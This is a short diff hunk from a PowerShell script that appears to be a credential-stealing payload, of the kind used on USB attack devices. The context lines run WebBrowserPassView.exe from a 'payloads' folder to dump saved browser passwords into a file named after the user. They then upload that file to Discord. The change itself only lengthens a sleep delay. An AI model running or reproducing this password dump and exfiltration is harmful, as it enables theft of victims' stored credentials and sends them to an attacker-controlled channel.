@@ -33,7 +33,7 @@ Start-Sleep -seconds 3
 Set-Location C:\payloads
 .\WebBrowserPassView.exe /stext passwords-$env:UserName$random.txt
 
-Start-Sleep -seconds 10
+Start-Sleep -seconds 15
 
 
 Upload-Discord -file "passwords-$env:UserName$random.txt"
